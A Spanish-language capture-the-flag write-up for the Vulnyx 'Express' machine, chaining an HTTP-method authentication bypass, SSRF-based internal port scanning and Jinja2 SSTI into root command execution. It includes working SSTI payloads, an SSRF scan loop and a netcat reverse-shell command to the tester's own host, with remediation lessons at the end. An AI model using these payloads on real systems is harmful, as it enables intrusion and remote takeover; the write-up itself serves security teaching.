# Writeup: Express (Vulnyx — Media)

Express es una máquina **Media** que simula un servidor Linux con un servicio web que expone varias APIs vulnerables. El recorrido comienza con el descubrimiento de la máquina en la red local y el escaneo de puertos, que revela un servidor Apache con una página por defecto. Tras añadir un dominio al archivo de hosts, se accede a una aplicación web que expone varios endpoints de API a través de un archivo JavaScript. Uno de estos endpoints (`/api/users`) tiene una vulnerabilidad de **bypass de autenticación basada en el método HTTP**: la verificación de la clave secreta solo se aplica al método GET, pero no al POST. Aprovechando esto, se obtiene la lista completa de usuarios con sus tokens, incluyendo el token del administrador. Con ese token, se accede a un endpoint de verificación de disponibilidad de URL (`/api/admin/availability`) que es vulnerable a **SSRF (Server-Side Request Forgery)**. Mediante el SSRF, se enumeran puertos internos y se descubre un servicio Flask en el puerto 9000 que es vulnerable a **SSTI (Server-Side Template Injection)**, lo que permite ejecución remota de comandos como `root`.

---

## Fase 1: Reconocimiento

Realizamos un escaneo de red local con `arp-scan` para descubrir hosts activos:

```bash
sudo arp-scan --localnet
```

**Resultado:**

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 192.168.1.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.3     50:bb:b5:ab:8c:0c       (Unknown)
192.168.1.1     10:07:1d:92:cf:98       Fiberhome Telecommunication Technologies Co.,LTD
192.168.1.7     00:a5:54:32:27:f6       Intel Corporate
192.168.1.47    08:00:27:bc:75:b7       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.319 seconds (110.39 hosts/sec). 4 responded
```

La MAC `08:00:27:bc:75:b7` corresponde a **Oracle VirtualBox**, lo que indica que `192.168.1.47` es nuestra máquina objetivo.

Realizamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 192.168.1.47 -oG allPorts
```

**Resultado:**

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:BC:75:B7 (Oracle VirtualBox virtual NIC)
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sCV -p 22,80 192.168.1.47 -oN targeted
```

**Resultados clave:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:BC:75:B7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Observaciones clave:**

- **Puerto 22 (SSH)**: OpenSSH 9.2p1 en Debian.
- **Puerto 80 (HTTP)**: Apache 2.4.62 con la página por defecto de Debian ("It works!").

---

## Fase 2: Enumeración web

### 2.1 Fuzzing de directorios

Realizamos un fuzzing de directorios con `feroxbuster`:

```bash
feroxbuster -u http://192.168.1.47/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado relevante:**

```
200      GET       25l      127w    10359c http://192.168.1.47/icons/openlogo-75.png
200      GET      368l      933w    10701c http://192.168.1.47/
301      GET        9l       28w      317c http://192.168.1.47/javascript => http://192.168.1.47/javascript/
301      GET        9l       28w      324c http://192.168.1.47/javascript/jquery => http://192.168.1.47/javascript/jquery/
200      GET    10907l    44549w   289782c http://192.168.1.47/javascript/jquery/jquery
```

No encontramos nada interesante, solo la página por defecto de Apache y una librería jQuery.

### 2.2 Verificación de métodos HTTP

```bash
curl -X OPTIONS -v http://192.168.1.47/
```

**Resultado:**

```
< HTTP/1.1 200 OK
< Date: Sun, 27 Sep 2026 14:33:54 GMT
< Server: Apache/2.4.62 (Debian)
< Allow: POST,OPTIONS,HEAD,GET
< Content-Length: 0
< Content-Type: text/html
```

Apache permite los métodos GET, POST, OPTIONS y HEAD.

### 2.3 Descubrimiento del dominio virtual

Como no encontramos nada importante usando la IP, probamos a añadir un dominio con el nombre de la máquina al archivo `/etc/hosts`:

```bash
echo "192.168.1.47 express.nyx" | sudo tee -a /etc/hosts
```

Accedemos a `http://express.nyx/` y encontramos una página web diferente, con varias playlists de música.

![Página principal de Express](./assets/express-main-page.png)

**Explicación:** El servidor Apache tiene configurado un **VirtualHost** que responde únicamente cuando se accede con el nombre de dominio `express.nyx`. Esto es una técnica común en entornos de hosting compartido y en máquinas CTF para forzar la enumeración de dominios virtuales.

---

## Fase 3: Análisis del código JavaScript

### 3.1 Inspección del código fuente

En el código fuente de la página encontramos dos archivos JavaScript:

```html
<script src="js/script.js"></script>
<script src="js/api.js"></script>
```

### 3.2 Análisis de `api.js`

El archivo `api.js` contiene varias funciones que interactúan con la API del servidor:

```javascript
function getMusicList() {
    fetch('/api/music/list')
        .then(response => response.json())
        .then(data => {
            console.log('Music genre list:', data);
        })
        .catch(error => {
            console.error('Error fetching the music list:', error);
        });
}

function getMusicSongs() {
    fetch('/api/music/songs')
        .then(response => response.json())
        .then(data => {
            console.log('List of songs:', data);
        })
        .catch(error => {
            console.error('Error fetching the list of songs:', error);
        });
}

function getUsersWithKey() {
    fetch(`/api/users?key=${secretKey}`)
        .then(response => response.json())
        .then(data => {
            console.log('User list (with key):', data);
        })
        .catch(error => {
            console.error('Error fetching the user list:', error);
        });
}

function checkUrlAvailability() {
    const data = {
        id: 1,
        url: 'http://example.com',
        token: '1234-1234-1234'
    };

    fetch('/api/admin/availability', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('URL status:', data);
    })
    .catch(error => {
        console.error('Error checking the URL availability:', error);
    });
}
```

**Endpoints descubiertos:**

- `/api/music/list` (GET)
- `/api/music/songs` (GET)
- `/api/users?key=<SECRET_KEY>` (GET)
- `/api/admin/availability` (POST)

**Hallazgo crítico:** El endpoint `/api/users` requiere una `secretKey` como parámetro de consulta. Necesitamos obtener esa clave.

---

## Fase 4: Descubrimiento del bypass de autenticación

### 4.1 Intento de acceso con GET

Probamos a acceder al endpoint `/api/users` con GET y sin la clave correcta:

```http
GET /api/users?key= HTTP/1.1
Host: express.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 22 Oct 2024 11:51:47 GMT
If-None-Match: "3fe6-6250f64e5545b-gzip"
Priority: u=0, i
```

**Resultado:**

```
HTTP/1.1 401 UNAUTHORIZED
Date: Sat, 03 Oct 2026 15:07:55 GMT
Server: Werkzeug/3.0.4 Python/3.11.2
Content-Type: application/json
Content-Length: 64
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
  "message": "Unauthorized,wrong key!",
  "result": "error"
}
```

El servidor rechaza la petición con un **401 Unauthorized** porque la clave es incorrecta o está vacía.

### 4.2 Bypass mediante cambio de método HTTP

Cambiamos el método de GET a POST:

```http
POST /api/users HTTP/1.1
Host: express.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 22 Oct 2024 11:51:47 GMT
If-None-Match: "3fe6-6250f64e5545b-gzip"
Priority: u=0, i
```

**Resultado:**

```
HTTP/1.1 200 OK
Date: Sat, 03 Oct 2026 15:09:02 GMT
Server: Werkzeug/3.0.4 Python/3.11.2
Content-Type: application/json
Content-Length: 2462
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

[
  {
    "id": 1,
    "roles": ["editor"],
    "token": "0653-0493-3031-8241",
    "username": "Xerosec"
  },
  {
    "id": 2,
    "roles": ["editor"],
    "token": "5868-6153-3183-7126",
    "username": "dreamer"
  },
  {
    "id": 3,
    "roles": ["viewer"],
    "token": "5244-3068-9188-0535",
    "username": "d4t4sec"
  },
  ...
  {
    "id": 18,
    "roles": ["admin"],
    "token": "4493-3179-0912-0597",
    "username": "JESSS"
  },
  ...
]
```

**Hallazgo crítico:** El endpoint `/api/users` con método POST **no valida la clave secreta**. Devuelve la lista completa de usuarios con sus tokens, incluyendo el token del administrador (`JESSS`).

### 4.3 Análisis de la vulnerabilidad: Bypass de autenticación basada en método HTTP

**Causa raíz:** El backend utiliza un patrón de enrutamiento que aplica la autenticación solo a ciertos métodos HTTP. En Flask, cuando se define una ruta con `methods=['GET', 'POST']`, el desarrollador debe **verificar la autenticación en todos los métodos**, no solo en uno.

**Código vulnerable (observado posteriormente):**

```python
@app.route('/api/users', methods=['GET', 'POST'])
def get_users():
    if request.method == 'GET':
        key = request.args.get('key')
        if not key or key != SECRET_KEY:
            return jsonify({'result': 'error', 'message': 'Unauthorized,wrong key!'}), 401
        return jsonify([...])
    elif request.method == 'POST':
        return jsonify([...])  # ¡No valida la clave!
```

**¿Por qué es peligroso?** La lógica de autorización se coloca dentro del bloque `if request.method == 'GET'`, por lo que cualquier petición POST evita la verificación. Este es un ejemplo clásico de **authentication bypass based on HTTP method**.

---

## Fase 5: SSRF en `/api/admin/availability`

### 5.1 Uso del token de administrador

Con el token del administrador (`4493-3179-0912-0597`), probamos el endpoint `/api/admin/availability`:

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 22 Oct 2024 11:51:47 GMT
If-None-Match: "3fe6-6250f64e5545b-gzip"
Priority: u=0, i
Content-Length: 69

{"id": 18, "url": "http://localhost", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.11.2
Content-Type: application/json

{
  "id": 18,
  "response_data": "\n<!DOCTYPE html PUBLIC ... (página por defecto de Apache) ...",
  "result": "success",
  "url_status": "active"
}
```

**Hallazgo:** El endpoint **realiza una petición HTTP a la URL proporcionada** y devuelve el contenido de la respuesta. Es vulnerable a **SSRF**.

### 5.2 Análisis de la vulnerabilidad: SSRF

**Causa raíz:** El servidor utiliza `requests.get(url)` sin validar la URL proporcionada por el usuario. Esto permite al atacante:

- Acceder a servicios internos (localhost, 127.0.0.1, redes internas).
- Leer archivos locales mediante `file://` (si el backend lo soporta).
- Interactuar con la API de metadatos de servicios cloud.
- Escanear puertos internos.

**Código vulnerable:**

```python
@app.route('/api/admin/availability', methods=['POST'])
def check():
    data = request.json
    url = data.get('url')
    ...
    response = requests.get(url, timeout=5)
    response_data = response.text
    ...
```

### 5.3 Enumeración de puertos internos

Usamos el SSRF para escanear puertos internos:

```bash
for p in $(seq 1 65535); do
  curl -s -m 3 -X POST http://express.nyx/api/admin/availability \
    -H "Content-Type: application/json" \
    -d "{\"id\":1,\"url\":\"http://127.0.0.1:${p}\",\"token\":\"4493-3179-0912-0597\"}" | \
  grep -q '"result": "success"\|"url_status": "active"' && echo "[+] ${p}"
done
```

**Resultado:**

```
[+] 80
[+] 5000
[+] 9000
```

Descubrimos tres puertos internos:
- **80**: Apache (ya conocido).
- **5000**: Un servicio Flask (probablemente la API principal).
- **9000**: Otro servicio Flask.

### 5.4 Exploración del puerto 5000

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json
Content-Length: 69

{"id": 18, "url": "http://localhost:5000", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
  "result": "success",
  "url_status": "inactive"
}
```

El puerto 5000 devuelve un **404 Not Found**, lo que indica que el servicio está activo pero la ruta raíz no existe.

### 5.5 Exploración del puerto 9000

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json
Content-Length: 69

{"id": 18, "url": "http://localhost:9000", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "\n    <form method=\"get\" action=\"/username\">\n        <input type=\"text\" name=\"name\" placeholder=\"Enter your name\">\n        <input type=\"submit\" value=\"Greet\">\n    </form>\n    ",
  "result": "success",
  "url_status": "active"
}
```

El puerto 9000 aloja un formulario que envía el parámetro `name` a `/username`.

### 5.6 Prueba del parámetro `name`

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json

{"id": 18, "url": "http://localhost:9000/username?name=kali", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "Hello, kali!",
  "result": "success",
  "url_status": "active"
}
```

El servicio responde con un saludo personalizado: `Hello, kali!`. Esto indica que el parámetro `name` se está **renderizando** en la respuesta, lo que sugiere una posible **SSTI (Server-Side Template Injection)**.

---

## Fase 6: SSTI en el puerto 9000

### 6.1 Confirmación de la SSTI

Probamos a inyectar una expresión matemática de Jinja2:

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json

{"id": 18, "url": "http://localhost:9000/username?name={{7*7}}", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "Hello, 49!",
  "result": "success",
  "url_status": "active"
}
```

La expresión `{{7*7}}` ha sido evaluada como `49`, confirmando la **SSTI**.

### 6.2 Prueba adicional

Probamos con una operación de concatenación de cadenas para confirmar que se trata de Jinja2:

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json

{"id": 18, "url": "http://localhost:9000/username?name={{7*'7'}}", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "Hello, 7777777!",
  "result": "success",
  "url_status": "active"
}
```

La expresión `{{7*'7'}}` se evalúa como `7777777` (concatenación de la cadena `'7'` siete veces), lo que confirma que se trata de **Jinja2** (en Twig, por ejemplo, `{{7*'7'}}` daría `49`).

### 6.3 Análisis de la vulnerabilidad: SSTI

**Causa raíz:** El backend construye dinámicamente la plantilla usando una **f-string de Python** y luego la pasa a `render_template_string`, lo que provoca una doble evaluación.

**Código vulnerable:**

```python
@app.route('/username', methods=['GET'])
def greet():
    name = request.args.get('name')
    if not name:
        return "The parameter <strong>name</strong> is missing."
    
    template = f"Hello, {name}!"
    return render_template_string(template)
```

**¿Por qué es peligroso?**

1. La f-string de Python sustituye `{name}` por el valor proporcionado por el usuario.
2. El resultado se pasa a `render_template_string`, que lo interpreta como una plantilla Jinja2.
3. Si el usuario envía `{{7*7}}`, la f-string lo inserta literalmente y Jinja2 lo evalúa.

**Forma segura:**

```python
template = "Hello, {{ name }}!"
return render_template_string(template, name=name)
```

De esta forma, Jinja2 trata `name` como texto plano y no evalúa su contenido.

---

## Fase 7: Ejecución Remota de Comandos (RCE)

### 7.1 Obtención del UID

Usamos un payload para leer el resultado del comando `id`:

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json

{"id": 18, "url": "http://localhost:9000/username?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "Hello, uid=0(root) gid=0(root) groups=0(root)\n!",
  "result": "success",
  "url_status": "active"
}
```

**Hallazgo crítico:** El servicio corre como **`root`** (UID 0).

### 7.2 Listado del directorio `/root`

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json

{"id": 18, "url": "http://localhost:9000/username?name={{config.__class__.__init__.__globals__['os'].popen('ls+/root/').read()}}", "token": "4493-3179-0912-0597"}
```

**Resultado:**

```json
{
  "id": 18,
  "response_data": "Hello, r00t.txt\n!",
  "result": "success",
  "url_status": "active"
}
```

Encontramos el archivo `r00t.txt` en el directorio `/root`.

### 7.3 Reverse shell

Enviamos un payload para obtener una reverse shell:

```http
POST /api/admin/availability HTTP/1.1
Host: express.nyx
Content-Type: application/json

{"id": 18, "url": "http://localhost:9000/username?name={{config.__class__.__init__.__globals__['os'].popen('busybox nc 192.168.1.10 443 -e bash').read()}}", "token": "4493-3179-0912-0597"}
```

En nuestra máquina Kali, iniciamos un listener:

```bash
nc -lnvp 443
```

**Resultado:**

```
listening on [any] 443 ...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.47] 48308
id
uid=0(root) gid=0(root) groups=0(root)
ls /root
r00t.txt
```

Obtenemos una shell como **`root`**. Leemos la flag:

```bash
cat /root/r00t.txt
```

---

## Fase 8: Análisis del código fuente (post-explotación)

### 8.1 Código de `ssti.py`

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <form method="get" action="/username">
        <input type="text" name="name" placeholder="Enter your name">
        <input type="submit" value="Greet">
    </form>
    '''

@app.route('/username', methods=['GET'])
def greet():
    name = request.args.get('name')
    if not name:
        return "The parameter <strong>name</strong> is missing."
    
    template = f"Hello, {name}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, port=9000)
```

**Vulnerabilidades identificadas:**

1. **SSTI**: Uso de f-string + `render_template_string` sin sanitización.
2. **`debug=True`**: El modo debug de Flask expone el **Werkzeug Debugger**, que permite ejecución de código arbitrario a través de la consola interactiva. Aunque en este caso la SSTI ya proporciona RCE, `debug=True` en producción es una vulnerabilidad crítica por sí misma.
3. **Ejecución como `root`**: El servicio corre con privilegios máximos, lo que amplifica el impacto de cualquier vulnerabilidad.

### 8.2 Código de `api.py`

```python
from flask import Flask, jsonify, request
import requests

app = Flask(__name__)

SECRET_TOKEN = "4493-3179-0912-0597"
SECRET_KEY = "6a9feb0e78f8a7adc2fb1a6994508e54"

@app.route('/api/music/list', methods=['GET'])
def get_list():
    return jsonify([
        {'id': 1, 'list': 'Pop'},
        {'id': 2, 'list': 'Rock'},
        {'id': 3, 'list': 'Kpop'}
    ])

@app.route('/api/music/songs', methods=['GET'])
def get_songs():
    return jsonify([
        {'id': 1, 'song': 'Taste, Sabrina Carpenter'},
        {'id': 2, 'song': 'Here and Now, Seether'},
        {'id': 3, 'song': 'Travel, Mamamoo'}
    ])

@app.route('/api/users', methods=['GET', 'POST'])
def get_users():
    if request.method == 'GET':
        key = request.args.get('key')
        if not key or key != SECRET_KEY:
            return jsonify({'result': 'error', 'message': 'Unauthorized,wrong key!'}), 401
        return jsonify([...])
    elif request.method == 'POST':
        return jsonify([...])  # ¡No valida la clave!

@app.route('/api/admin/availability', methods=['POST'])
def check():
    data = request.json
    url = data.get('url')
    id_ = data.get('id')
    token = data.get('token')

    if not token or token != SECRET_TOKEN:
        return jsonify({'result': 'error', 'message': 'Unauthorized, wrong token'}), 401

    if not url or not id_ or not token:
        return jsonify({'result': 'error', 'message': 'id, url, and token are required'}), 400

    try:
        response = requests.get(url, timeout=5)
        response_data = response.text

        if response.status_code == 200:
            return jsonify({
                'result': 'success',
                'id': id_,
                'url_status': 'active',
                'response_data': response_data
            })
        else:
            return jsonify({
                'result': 'success',
                'id': id_,
                'url_status': 'inactive',
                'response_data': response_data
            })
    except requests.RequestException as e:
        return jsonify({
            'result': 'error',
            'id': id_,
            'url_status': 'unreachable',
            'error_message': str(e)
        })

if __name__ == '__main__':
    app.run(debug=True)
```

**Vulnerabilidades identificadas:**

1. **Bypass de autenticación basado en método HTTP**: El método POST del endpoint `/api/users` no valida la clave secreta.
2. **Credenciales hardcodeadas**: `SECRET_TOKEN` y `SECRET_KEY` están en el código fuente.
3. **SSRF**: El endpoint `/api/admin/availability` realiza peticiones HTTP sin validar la URL.
4. **`debug=True`**: El modo debug de Flask está habilitado.

---

## 📌 Conclusión

Express es una máquina **Media** que combina múltiples vulnerabilidades en aplicaciones Flask:

1. **Enumeración de red** con `arp-scan` y Nmap.
2. **Descubrimiento de VirtualHost** mediante la adición de un dominio al archivo `/etc/hosts`.
3. **Análisis del código JavaScript** para descubrir endpoints de API.
4. **Bypass de autenticación basado en método HTTP** en `/api/users` para obtener tokens de usuario.
5. **SSRF** en `/api/admin/availability` para enumerar puertos internos y acceder a servicios internos.
6. **SSTI** en el puerto 9000 para ejecución remota de comandos.
7. **Escalada a `root`** debido a que el servicio SSTI corre con privilegios máximos.

---

## 📚 Lecciones aprendidas

1. **La autenticación debe aplicarse a todos los métodos HTTP, no solo a uno**  
   El endpoint `/api/users` validaba la clave secreta solo en las peticiones GET, pero no en las POST. Este patrón es más común de lo que parece y permite a un atacante evadir la autenticación simplemente cambiando el método HTTP. La autenticación debe aplicarse de forma transversal, idealmente mediante un decorador o middleware.

2. **Las credenciales nunca deben estar hardcodeadas en el código fuente**  
   `SECRET_TOKEN` y `SECRET_KEY` estaban en texto plano en `api.py`. Cualquier persona con acceso al código (o al repositorio) puede obtenerlos. Las credenciales deben almacenarse en variables de entorno o en un gestor de secretos.

3. **El SSRF es un vector de ataque crítico en aplicaciones que realizan peticiones HTTP**  
   El endpoint `/api/admin/availability` aceptaba cualquier URL y devolvía el contenido de la respuesta. Esto permitió enumerar puertos internos y acceder a servicios que no deberían ser accesibles desde el exterior. Las URLs deben validarse contra una lista blanca y bloquear direcciones privadas (localhost, 127.0.0.1, rangos RFC1918).

4. **La combinación de f-string y `render_template_string` es peligrosa**  
   El uso de f-strings para construir plantillas y luego pasarlas a `render_template_string` permite inyección de código. Las plantillas deben ser estáticas y los datos deben pasarse como contexto a Jinja2 de forma segura.

5. **Los servicios no deben ejecutarse como `root`**  
   El servicio SSTI en el puerto 9000 corría como `root`, lo que amplificó el impacto de la vulnerabilidad. Los servicios deben ejecutarse con el menor privilegio posible, utilizando usuarios dedicados sin acceso a archivos críticos.

6. **La enumeración de puertos internos mediante SSRF es una técnica efectiva**  
   El SSRF permitió descubrir servicios que no estaban expuestos externamente (puertos 5000 y 9000). Los atacantes pueden usar esta técnica para mapear la red interna y encontrar servicios vulnerables.

7. **La enumeración de VirtualHosts es esencial en entornos web**  
   La máquina solo revelaba su verdadera aplicación cuando se accedía con el dominio `express.nyx`. Esto demuestra la importancia de enumerar dominios virtuales además de directorios y archivos.

8. **Los archivos JavaScript del lado del cliente pueden filtrar endpoints de API**  
   El archivo `api.js` reveló todos los endpoints de la API, incluyendo el endpoint de administración. Los desarrolladores deben ser conscientes de que cualquier información incluida en el frontend es visible para el atacante.

9. **La cadena de vulnerabilidades amplifica el impacto**  
    Ninguna vulnerabilidad individual habría sido suficiente para obtener `root`. Fue la combinación de bypass de autenticación → SSRF → SSTI → ejecución como root lo que permitió el compromiso total. La seguridad en profundidad es esencial para mitigar este tipo de cadenas de ataque.

